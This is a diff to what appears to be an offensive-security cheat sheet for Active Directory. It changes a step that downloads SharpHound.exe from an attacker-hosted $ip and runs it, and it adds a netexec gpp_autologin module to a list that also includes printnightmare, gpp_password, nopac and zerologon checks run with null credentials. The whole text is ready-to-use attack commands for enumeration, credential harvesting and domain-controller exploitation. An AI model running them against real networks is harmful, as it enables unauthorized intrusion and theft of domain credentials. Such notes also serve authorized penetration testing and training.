@@ -1,8 +1,8 @@
 ```bash
 bloodhound-python -d $domain -u user -p pass -ns $ip -c all
 
-curl $ip/SharpHound.exe -o SharpHound.exe
-.\SharpHound.exe -c all
+iwr $ip/SharpHound.exe -o SharpHound.exe
+.\SharpHound.exe -c all 
 ```
 
 ```bash
@@ -15,6 +15,7 @@ netexec mssql 172.16.5.0/24 -u user -p pass123 --local-auth
 netexec smb <IP> -u '' -p '' -M spider_plus
 netexec smb <IP> -u '' -p '' -M printnightmare
 netexec smb <IP> -u '' -p '' -M gpp_password
+netexec smb <IP> -u '' -p '' -M gpp_autologin
 netexec smb <IP> -u '' -p '' -M nopac
 netexec smb <IP> -u '' -p '' -M zerologon
 ```
